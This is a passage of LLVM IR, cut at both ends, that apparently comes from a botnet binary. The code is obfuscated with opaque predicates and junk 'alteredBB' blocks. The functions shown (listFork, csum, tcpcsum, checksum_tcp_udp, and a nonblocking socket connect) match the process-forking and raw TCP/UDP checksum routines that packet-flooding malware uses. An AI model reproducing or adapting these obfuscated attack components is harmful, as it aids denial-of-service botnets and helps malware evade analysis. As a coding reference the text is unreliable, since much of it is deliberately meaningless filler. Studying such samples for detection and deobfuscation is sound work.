; <label>:155:                                    ; preds = %154, %originalBBpart24
  %156 = load i32, i32* @x.27
  %157 = load i32, i32* @y.28
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %155
  %164 = load i32, i32* %6, align 4
  %165 = call i32 (i32, i32, ...) @fcntl(i32 %164, i32 3, i8* null)
  %166 = sext i32 %165 to i64
  store i64 %166, i64* %15, align 8
  %167 = load i64, i64* %15, align 8
  %168 = and i64 %167, -2049
  store i64 %168, i64* %15, align 8
  %169 = load i32, i32* %6, align 4
  %170 = load i64, i64* %15, align 8
  %171 = call i32 (i32, i32, ...) @fcntl(i32 %169, i32 4, i64 %170)
  store i32 1, i32* %5, align 4
  %172 = load i32, i32* @x.27
  %173 = load i32, i32* @y.28
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart225, label %originalBB14alteredBB

originalBBpart225:                                ; preds = %originalBB14
  br label %180

; <label>:180:                                    ; preds = %originalBBpart225, %153, %151, %149, %originalBBpart2
  %181 = load i32, i32* @x.27
  %182 = load i32, i32* @y.28
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %180
  %189 = load i32, i32* %5, align 4
  %190 = load i32, i32* @x.27
  %191 = load i32, i32* @y.28
  %192 = sub i32 %190, 1
  %193 = mul i32 %190, %192
  %194 = urem i32 %193, 2
  %195 = icmp eq i32 %194, 0
  %196 = icmp slt i32 %191, 10
  %197 = or i1 %195, %196
  br i1 %197, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  ret i32 %189

originalBBalteredBB:                              ; preds = %originalBB, %36
  store i32 0, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %199 = getelementptr inbounds [8 x i8], [8 x i8]* %198, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %199, i8 0, i64 8, i32 4, i1 false)
  %200 = load i32, i32* %6, align 4
  %201 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %202 = call i32 @connect(i32 %200, %struct.sockaddr* %201, i32 16)
  store i32 %202, i32* %16, align 4
  %203 = load i32, i32* %16, align 4
  %204 = icmp slt i32 %203, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %81
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %206, i64* %207, align 8
  %208 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %208, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %127
  store i32 4, i32* %13, align 4
  %209 = load i32, i32* %6, align 4
  %210 = bitcast i32* %14 to i8*
  %211 = call i32 @getsockopt(i32 %209, i32 1, i32 4, i8* %210, i32* %13) #6
  %212 = load i32, i32* %14, align 4
  %213 = icmp ne i32 %212, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %155
  %214 = load i32, i32* %6, align 4
  %215 = call i32 (i32, i32, ...) @fcntl(i32 %214, i32 3, i8* null)
  %216 = sext i32 %215 to i64
  store i64 %216, i64* %15, align 8
  %217 = load i64, i64* %15, align 8
  %_ = shl i64 %217, -2049
  %_15 = sub i64 %217, -2049
  %gen = mul i64 %_15, -2049
  %_16 = sub i64 %217, -2049
  %gen17 = mul i64 %_16, -2049
  %_18 = sub i64 %217, -2049
  %gen19 = mul i64 %_18, -2049
  %_20 = sub i64 %217, -2049
  %gen21 = mul i64 %_20, -2049
  %_22 = sub i64 0, %217
  %gen23 = add i64 %_22, -2049
  %218 = and i64 %217, -2049
  store i64 %218, i64* %15, align 8
  %219 = load i32, i32* %6, align 4
  %220 = load i64, i64* %15, align 8
  %221 = call i32 (i32, i32, ...) @fcntl(i32 %219, i32 4, i64 %220)
  store i32 1, i32* %5, align 4
  br label %originalBB14

originalBB27alteredBB:                            ; preds = %originalBB27, %180
  %222 = load i32, i32* %5, align 4
  br label %originalBB27
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = load i32, i32* @x.29
  %2 = load i32, i32* @y.30
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = call i32 @fork() #6
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* %10, align 4
  %15 = icmp ule i32 %14, 0
  %16 = load i32, i32* @x.29
  %17 = load i32, i32* @y.30
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %42

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* @x.29
  %26 = load i32, i32* @y.30
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %24
  %33 = load i32, i32* %10, align 4
  store i32 %33, i32* %9, align 4
  %34 = load i32, i32* @x.29
  %35 = load i32, i32* @y.30
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %95

; <label>:42:                                     ; preds = %originalBBpart2
  %43 = load i64, i64* @numpids, align 8
  %44 = add i64 %43, 1
  store i64 %44, i64* @numpids, align 8
  %45 = load i64, i64* @numpids, align 8
  %46 = add i64 %45, 1
  %47 = mul i64 %46, 4
  %48 = call noalias i8* @malloc(i64 %47) #6
  %49 = bitcast i8* %48 to i32*
  store i32* %49, i32** %11, align 8
  store i32 0, i32* %12, align 4
  br label %50

; <label>:50:                                     ; preds = %82, %42
  %51 = load i32, i32* %12, align 4
  %52 = zext i32 %51 to i64
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 %53, 1
  %55 = icmp ult i64 %52, %54
  br i1 %55, label %56, label %85

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* @x.29
  %58 = load i32, i32* @y.30
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %56
  %65 = load i32*, i32** @pids, align 8
  %66 = load i32, i32* %12, align 4
  %67 = zext i32 %66 to i64
  %68 = getelementptr inbounds i32, i32* %65, i64 %67
  %69 = load i32, i32* %68, align 4
  %70 = load i32*, i32** %11, align 8
  %71 = load i32, i32* %12, align 4
  %72 = zext i32 %71 to i64
  %73 = getelementptr inbounds i32, i32* %70, i64 %72
  store i32 %69, i32* %73, align 4
  %74 = load i32, i32* @x.29
  %75 = load i32, i32* @y.30
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %82

; <label>:82:                                     ; preds = %originalBBpart28
  %83 = load i32, i32* %12, align 4
  %84 = add i32 %83, 1
  store i32 %84, i32* %12, align 4
  br label %50

; <label>:85:                                     ; preds = %50
  %86 = load i32, i32* %10, align 4
  %87 = load i32*, i32** %11, align 8
  %88 = load i64, i64* @numpids, align 8
  %89 = sub i64 %88, 1
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  store i32 %86, i32* %90, align 4
  %91 = load i32*, i32** @pids, align 8
  %92 = bitcast i32* %91 to i8*
  call void @free(i8* %92) #6
  %93 = load i32*, i32** %11, align 8
  store i32* %93, i32** @pids, align 8
  %94 = load i32, i32* %10, align 4
  store i32 %94, i32* %9, align 4
  br label %95

; <label>:95:                                     ; preds = %85, %originalBBpart24
  %96 = load i32, i32* @x.29
  %97 = load i32, i32* @y.30
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %95
  %104 = load i32, i32* %9, align 4
  %105 = load i32, i32* @x.29
  %106 = load i32, i32* @y.30
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  ret i32 %104

originalBBalteredBB:                              ; preds = %originalBB, %0
  %113 = alloca i32, align 4
  %114 = alloca i32, align 4
  %115 = alloca i32*, align 8
  %116 = alloca i32, align 4
  %117 = call i32 @fork() #6
  store i32 %117, i32* %114, align 4
  %118 = load i32, i32* %114, align 4
  %119 = icmp ule i32 %118, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %24
  %120 = load i32, i32* %10, align 4
  store i32 %120, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %56
  %121 = load i32*, i32** @pids, align 8
  %122 = load i32, i32* %12, align 4
  %123 = zext i32 %122 to i64
  %124 = getelementptr inbounds i32, i32* %121, i64 %123
  %125 = load i32, i32* %124, align 4
  %126 = load i32*, i32** %11, align 8
  %127 = load i32, i32* %12, align 4
  %128 = zext i32 %127 to i64
  %129 = getelementptr inbounds i32, i32* %126, i64 %128
  store i32 %125, i32* %129, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %95
  %130 = load i32, i32* %9, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6

; <label>:18:                                     ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

; <label>:28:                                     ; preds = %21, %18
  br label %29

; <label>:29:                                     ; preds = %49, %28
  %30 = load i32, i32* @x.31
  %31 = load i32, i32* @y.32
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  %41 = load i32, i32* @x.31
  %42 = load i32, i32* @y.32
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %49, label %55

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i64, i64* %5, align 8
  %51 = and i64 %50, 65535
  %52 = load i64, i64* %5, align 8
  %53 = lshr i64 %52, 16
  %54 = add i64 %51, %53
  store i64 %54, i64* %5, align 8
  br label %29

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* @x.31
  %57 = load i32, i32* @y.32
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %55
  %64 = load i64, i64* %5, align 8
  %65 = xor i64 %64, -1
  %66 = trunc i64 %65 to i16
  %67 = load i32, i32* @x.31
  %68 = load i32, i32* @y.32
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart219, label %originalBB4alteredBB

originalBBpart219:                                ; preds = %originalBB4
  ret i16 %66

originalBBalteredBB:                              ; preds = %originalBB, %29
  %75 = load i64, i64* %5, align 8
  %_ = shl i64 %75, 16
  %_1 = sub i64 0, %75
  %gen = add i64 %_1, 16
  %_2 = sub i64 %75, 16
  %gen3 = mul i64 %_2, 16
  %76 = lshr i64 %75, 16
  %77 = icmp ne i64 %76, 0
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %55
  %78 = load i64, i64* %5, align 8
  %_5 = sub i64 0, %78
  %gen6 = add i64 %_5, -1
  %_7 = sub i64 %78, -1
  %gen8 = mul i64 %_7, -1
  %_9 = sub i64 0, %78
  %gen10 = add i64 %_9, -1
  %_11 = sub i64 %78, -1
  %gen12 = mul i64 %_11, -1
  %_13 = sub i64 0, %78
  %gen14 = add i64 %_13, -1
  %_15 = sub i64 %78, -1
  %gen16 = mul i64 %_15, -1
  %_17 = shl i64 %78, -1
  %79 = xor i64 %78, -1
  %80 = trunc i64 %79 to i16
  br label %originalBB4
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #9
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #6
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #6
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = load i32, i32* @x.35
  %6 = load i32, i32* @y.36
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca %struct.iphdr*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i16, align 2
  %16 = alloca i32, align 4
  %17 = alloca i16*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %13, align 8
  store i8* %1, i8** %14, align 8
  store i16 %2, i16* %15, align 2
  store i32 %3, i32* %16, align 4
  %22 = load i8*, i8** %14, align 8
  %23 = bitcast i8* %22 to i16*
  store i16* %23, i16** %17, align 8
  %24 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %25 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %24, i32 0, i32 8
  %26 = load i32, i32* %25, align 4
  store i32 %26, i32* %18, align 4
  %27 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 9
  %29 = load i32, i32* %28, align 4
  store i32 %29, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %30 = load i32, i32* %16, align 4
  store i32 %30, i32* %21, align 4
  %31 = load i32, i32* @x.35
  %32 = load i32, i32* @y.36
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %39

; <label>:39:                                     ; preds = %58, %originalBBpart2
  %40 = load i32, i32* @x.35
  %41 = load i32, i32* @y.36
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load i32, i32* %16, align 4
  %49 = icmp sgt i32 %48, 1
  %50 = load i32, i32* @x.35
  %51 = load i32, i32* @y.36
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %49, label %58, label %68

; <label>:58:                                     ; preds = %originalBBpart24
  %59 = load i16*, i16** %17, align 8
  %60 = load i16, i16* %59, align 2
  %61 = zext i16 %60 to i32
  %62 = load i32, i32* %20, align 4
  %63 = add i32 %62, %61
  store i32 %63, i32* %20, align 4
  %64 = load i16*, i16** %17, align 8
  %65 = getelementptr inbounds i16, i16* %64, i32 1
  store i16* %65, i16** %17, align 8
  %66 = load i32, i32* %16, align 4
  %67 = sub nsw i32 %66, 2
  store i32 %67, i32* %16, align 4
  br label %39

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i32, i32* @x.35
  %70 = load i32, i32* @y.36
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i32, i32* %16, align 4
  %78 = icmp eq i32 %77, 1
  %79 = load i32, i32* @x.35
  %80 = load i32, i32* @y.36
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %78, label %87, label %110

; <label>:87:                                     ; preds = %originalBBpart28
  %88 = load i32, i32* @x.35
  %89 = load i32, i32* @y.36
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %87
  %96 = load i16*, i16** %17, align 8
  %97 = bitcast i16* %96 to i8*
  %98 = load i8, i8* %97, align 1
  %99 = zext i8 %98 to i32
  %100 = load i32, i32* %20, align 4
  %101 = add i32 %100, %99
  store i32 %101, i32* %20, align 4
  %102 = load i32, i32* @x.35
  %103 = load i32, i32* @y.36
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart213, label %originalBB10alteredBB

originalBBpart213:                                ; preds = %originalBB10
  br label %110

; <label>:110:                                    ; preds = %originalBBpart213, %originalBBpart28
  %111 = load i32, i32* %18, align 4
  %112 = lshr i32 %111, 16
  %113 = and i32 %112, 65535
  %114 = load i32, i32* %20, align 4
  %115 = add i32 %114, %113
  store i32 %115, i32* %20, align 4
  %116 = load i32, i32* %18, align 4
  %117 = and i32 %116, 65535
  %118 = load i32, i32* %20, align 4
  %119 = add i32 %118, %117
  store i32 %119, i32* %20, align 4
  %120 = load i32, i32* %19, align 4
  %121 = lshr i32 %120, 16
  %122 = and i32 %121, 65535
  %123 = load i32, i32* %20, align 4
  %124 = add i32 %123, %122
  store i32 %124, i32* %20, align 4
  %125 = load i32, i32* %19, align 4
  %126 = and i32 %125, 65535
  %127 = load i32, i32* %20, align 4
  %128 = add i32 %127, %126
  store i32 %128, i32* %20, align 4
  %129 = load %struct.iphdr*, %struct.iphdr** %13, align 8
  %130 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %129, i32 0, i32 6
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i16
  %133 = call zeroext i16 @htons(i16 zeroext %132) #9
  %134 = zext i16 %133 to i32
  %135 = load i32, i32* %20, align 4
  %136 = add i32 %135, %134
  store i32 %136, i32* %20, align 4
  %137 = load i16, i16* %15, align 2
  %138 = zext i16 %137 to i32
  %139 = load i32, i32* %20, align 4
  %140 = add i32 %139, %138
  store i32 %140, i32* %20, align 4
  br label %141

; <label>:141:                                    ; preds = %originalBBpart269, %110
  %142 = load i32, i32* @x.35
  %143 = load i32, i32* @y.36
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %141
  %150 = load i32, i32* %20, align 4
  %151 = lshr i32 %150, 16
  %152 = icmp ne i32 %151, 0
  %153 = load i32, i32* @x.35
  %154 = load i32, i32* @y.36
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart232, label %originalBB15alteredBB

originalBBpart232:                                ; preds = %originalBB15
  br i1 %152, label %161, label %183

; <label>:161:                                    ; preds = %originalBBpart232
  %162 = load i32, i32* @x.35
  %163 = load i32, i32* @y.36
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %161
  %170 = load i32, i32* %20, align 4
  %171 = and i32 %170, 65535
  %172 = load i32, i32* %20, align 4
  %173 = lshr i32 %172, 16
  %174 = add i32 %171, %173
  store i32 %174, i32* %20, align 4
  %175 = load i32, i32* @x.35
  %176 = load i32, i32* @y.36
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart269, label %originalBB34alteredBB

originalBBpart269:                                ; preds = %originalBB34
  br label %141

; <label>:183:                                    ; preds = %originalBBpart232
  %184 = load i32, i32* %20, align 4
  %185 = xor i32 %184, -1
  %186 = trunc i32 %185 to i16
  ret i16 %186

originalBBalteredBB:                              ; preds = %originalBB, %4
  %187 = alloca %struct.iphdr*, align 8
  %188 = alloca i8*, align 8
  %189 = alloca i16, align 2
  %190 = alloca i32, align 4
  %191 = alloca i16*, align 8
  %192 = alloca i32, align 4
  %193 = alloca i32, align 4
  %194 = alloca i32, align 4
  %195 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %187, align 8
  store i8* %1, i8** %188, align 8
  store i16 %2, i16* %189, align 2
  store i32 %3, i32* %190, align 4
  %196 = load i8*, i8** %188, align 8
  %197 = bitcast i8* %196 to i16*
  store i16* %197, i16** %191, align 8
  %198 = load %struct.iphdr*, %struct.iphdr** %187, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 8
  %200 = load i32, i32* %199, align 4
  store i32 %200, i32* %192, align 4
  %201 = load %struct.iphdr*, %struct.iphdr** %187, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 9
  %203 = load i32, i32* %202, align 4
  store i32 %203, i32* %193, align 4
  store i32 0, i32* %194, align 4
  %204 = load i32, i32* %190, align 4
  store i32 %204, i32* %195, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %205 = load i32, i32* %16, align 4
  %206 = icmp sgt i32 %205, 1
  br label %originalBB1
